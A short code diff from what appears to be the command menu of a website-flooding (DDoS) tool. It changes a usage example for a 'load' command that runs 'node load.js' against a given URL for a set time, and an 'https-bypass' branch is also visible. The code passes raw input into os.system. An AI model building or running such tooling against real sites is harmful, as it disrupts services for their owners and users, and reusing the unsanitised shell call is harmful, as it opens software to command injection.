@@ -274,7 +274,7 @@ def main():
                 os.system(f'node load.js {url} {time} 32 10')
             except IndexError:
                 print('Usage: load <url> <time> ')
-                print('Example: load http://example-cloud.com 20 15')
+                print('Example: load http://example-cloud.com 60')
 
         elif "https-bypass" in cnc:
             try:
